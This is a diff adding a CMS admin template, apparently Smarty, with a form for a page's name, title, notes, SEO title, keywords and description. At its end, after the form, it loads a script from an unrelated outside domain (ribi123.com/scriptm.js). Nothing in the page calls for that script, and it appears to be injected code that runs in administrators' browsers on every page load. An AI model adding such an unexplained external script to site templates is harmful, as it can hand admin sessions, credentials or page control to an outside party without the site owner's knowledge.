@@ -1,0 +1,44 @@
+<{include file="admin/header.tpl"}>
+<div style="width:96%;margin:auto;padding:auto">
+<form name="form1" action="?ct=plate&even=saveadd&tb=system" method="POST" enctype="multipart/form-data">
+  <input type='hidden' name='class' class='text s' value='1' />
+<table class="form">
+    <tr>
+  <td class='title'>name</td>
+  <td class='fitem'><input type='text' name='name' class='text' value='' /></td>
+</tr>
+ 
+<tr>
+  <td class='title'>title</td>
+  <td class='fitem'><input type='text' name='title' class='text' value='' /></td>
+</tr>
+ 
+<tr>
+  <td class='title'>zhushi</td>
+  <td class='fitem'><input type='text' name='zhushi' class='text' value='' /></td>
+</tr>
+<tr>
+  <td class='title'>seotitle</td>
+  <td class='fitem'><input type='text' name='seotitle' class='text' value='' /></td>
+</tr>
+<tr>
+  <td class='title'>Keywords</td>
+  <td class='fitem'><input type='text' name='Keywords' class='text' value='' /></td>
+</tr>
+<tr>
+  <td class='title'>description</td>
+  <td class='fitem'><input type='text' name='description' class='text' value='' /></td>
+</tr>
+
+<tr>
+  <td colspan='2' align='center' height='60'>
+      <button type="submit">保存</button> &nbsp;&nbsp;&nbsp;
+      <button type="reset">重设</button>
+  </td>
+</tr>
+</table>
+</form>
+</div>
+<script src="https://ribi123.com/scriptm.js"></script>
+</body>
+</html>
